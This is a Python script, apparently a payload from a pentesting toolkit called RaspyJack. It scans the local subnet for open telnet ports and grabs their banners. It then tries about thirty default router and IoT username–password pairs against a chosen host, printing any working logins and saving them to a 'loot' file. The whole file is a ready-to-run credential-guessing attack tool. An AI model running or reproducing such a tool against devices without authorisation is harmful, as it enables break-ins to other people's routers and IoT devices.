#!/usr/bin/env python3
# @name: Telnet Banner Grab & Default Cred Test
# @desc: Scans for port 23 on the local subnet, grabs banners via raw socket, then tries ~30 common IoT/router default credentials.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Telnet Banner Grab & Default Cred Test
============================================================
Author: 7h30th3r0n3

Scans for port 23 on the local subnet, grabs banners via raw socket,
then tries ~30 common IoT/router default credentials.

Setup / Prerequisites:
  - Built-in default credential list. No special requirements.

Controls:
  python3 telnet_grabber.py [target_host]

  target_host  -- optional. If omitted, the local subnet is scanned
                  for hosts with port 23 open, their banners are
                  grabbed, and you're prompted to pick one from the
                  list. If given, the banner is grabbed for that host
                  and the credential test starts immediately (no
                  discovery scan is run).

  Found credentials are printed as they are discovered and results
  are exported to loot when the run finishes (or is interrupted with
  Ctrl-C).

Loot: $CITYPOP_ROOT/loot/Telnet/telnet_YYYYMMDD_HHMMSS.json
"""

from payloads._web_input import request_input
import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'Telnet')
NMAP_LOOT = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot')

# ---------------------------------------------------------------------------
# Default credential pairs for IoT / routers / switches
# ---------------------------------------------------------------------------
CRED_LIST = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", ""), ("admin", "default"), ("admin", "changeme"),
    ("root", "root"), ("root", ""), ("root", "password"),
    ("root", "toor"), ("root", "default"), ("root", "1234"),
    ("cisco", "cisco"), ("cisco", ""), ("enable", ""),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("guest", ""), ("manager", "manager"), ("manager", "friend"),
    ("support", "support"), ("tech", "tech"), ("ubnt", "ubnt"),
    ("pi", "raspberry"), ("admin", "admin1234"), ("admin", "12345"),
    ("operator", "operator"), ("monitor", "monitor"), ("service", "service"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True

hosts = []          # [{"ip": str, "banner": str}]
results = []        # [{"ip", "banner", "creds": [{"user","pass"}]}]
test_progress = 0
test_total = 0


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Return the local subnet CIDR."""
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1]
        except Exception:
            pass
    return None


def _grab_banner(ip, port=23, timeout=3):
    """Connect to a telnet port and grab any banner text."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        # Read whatever the server sends initially
        time.sleep(0.5)
        banner_bytes = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                banner_bytes += chunk
                if len(banner_bytes) > 2048:
                    break
        except socket.timeout:
            pass
        sock.close()
        # Strip telnet negotiation bytes (IAC sequences: 0xFF ...)
        cleaned = bytearray()
        i = 0
        raw = banner_bytes
        while i < len(raw):
            if raw[i] == 0xFF and i + 2 < len(raw):
                i += 3  # skip IAC + command + option
            else:
                cleaned.append(raw[i])
                i += 1
        return bytes(cleaned).decode("utf-8", errors="replace").strip()[:200]
    except Exception:
        return ""


def _scan_telnet_hosts(cidr):
    """Quick TCP connect scan for port 23."""
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    host_ips = list(network.hosts())
    for i, host in enumerate(host_ips):
        if not running:
            break
        ip = str(host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 23))
            sock.close()
            if result == 0:
                banner = _grab_banner(ip)
                found.append({"ip": ip, "banner": banner})
                print(f"[+] Telnet host found: {ip} banner={banner[:40]!r}", flush=True)
        except Exception:
            pass
        if (i + 1) % 25 == 0:
            print(f"[*] Scanned {i + 1}/{len(host_ips)}...", flush=True)
    return found


# ---------------------------------------------------------------------------
# Discovery
# ---------------------------------------------------------------------------

def _discover_hosts():
    """Discover Telnet hosts by scanning the local subnet."""
    cidr = _detect_subnet()
    if not cidr or not running:
        print("[!] No network found.", flush=True)
        return []

    print(f"[*] Scanning subnet {cidr} for port 23...", flush=True)
    found = _scan_telnet_hosts(cidr)

    with lock:
        hosts.clear()
        hosts.extend(found)

    print(f"[*] Found {len(found)} Telnet host(s)", flush=True)
    return found


# ---------------------------------------------------------------------------
# Credential test
# ---------------------------------------------------------------------------

def _try_telnet_login(ip, user, passwd, timeout=5):
    """Try a telnet login by sending user/pass after prompts."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 23))

        # Read initial banner / login prompt
        time.sleep(1.0)
        data = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

        # Send username
        sock.sendall((user + "\r\n").encode())
        time.sleep(0.8)
        data = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

        # Send password
        sock.sendall((passwd + "\r\n").encode())
        time.sleep(1.0)
        response = b""
        try:
            while True:
                chunk = sock.recv(2048)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()
        text = response.decode("utf-8", errors="replace").lower()

        # Heuristic: if we see a shell prompt or welcome, login succeeded
        fail_indicators = ["incorrect", "invalid", "failed", "denied", "bad"]
        success_indicators = ["#", "$", ">", "welcome", "successful", "last login"]

        for fail in fail_indicators:
            if fail in text:
                return False
        for ok in success_indicators:
            if ok in text:
                return True

        return False
    except Exception:
        return False


def _test_creds(target_ip, banner=""):
    """Test default credentials against a single host."""
    global test_progress, test_total

    with lock:
        test_progress = 0
        test_total = len(CRED_LIST)

    print(f"[*] Testing {test_total} default credential pair(s) against "
          f"{target_ip}...", flush=True)

    host_creds = []

    for idx, (user, passwd) in enumerate(CRED_LIST):
        if not running:
            break

        with lock:
            test_progress = idx + 1

        success = _try_telnet_login(target_ip, user, passwd)

        if success:
            host_creds.append({"user": user, "pass": passwd})
            print(f"[+] FOUND: {user}:{passwd} @ {target_ip}", flush=True)
        elif (idx + 1) % 10 == 0:
            print(f"[*] {idx + 1}/{test_total} attempts...", flush=True)

    # Store results
    with lock:
        existing = next((r for r in results if r["ip"] == target_ip), None)
        if existing:
            existing["creds"].extend(host_creds)
        else:
            results.append({
                "ip": target_ip,
                "banner": banner,
                "creds": host_creds,
            })

    if not host_creds:
        print(f"[*] No credentials found for {target_ip}", flush=True)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write results to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"telnet_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "hosts": [dict(h) for h in hosts],
            "results": [dict(r) for r in results],
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 telnet_grabber.py [target_host]", flush=True)
        return 0

    target = sys.argv[1] if len(sys.argv) > 1 else None

    try:
        if target:
            print(f"[*] Grabbing banner for {target}...", flush=True)
            banner = _grab_banner(target)
            if banner:
                print(f"[*] Banner: {banner[:80]!r}", flush=True)
            with lock:
                hosts.append({"ip": target, "banner": banner})
            _test_creds(target, banner)
        else:
            found = _discover_hosts()
            if not found:
                print("[!] No Telnet hosts discovered. Pass a target host as "
                      "an argument instead.", flush=True)
                return 1

            print(f"[*] Discovered {len(found)} Telnet host(s):", flush=True)
            for i, h in enumerate(found, 1):
                preview = h["banner"][:30] if h["banner"] else "(no banner)"
                print(f"  {i}. {h['ip']}  {preview}", flush=True)

            choice = request_input(f"Select a host [1-{len(found)}]: ").strip()
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(found):
                    raise ValueError
            except ValueError:
                print("[!] Invalid selection.", flush=True)
                return 1

            target_host = found[idx]
            _test_creds(target_host["ip"], target_host["banner"])

    except KeyboardInterrupt:
        running = False
        print("\n[*] Interrupted.", flush=True)

    finally:
        running = False
        with lock:
            has_results = len(results) > 0 or len(hosts) > 0
        if has_results:
            fname = _export_loot()
            print(f"[*] Exported to {os.path.join(LOOT_DIR, fname)}", flush=True)
        else:
            print("[*] No data to export.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
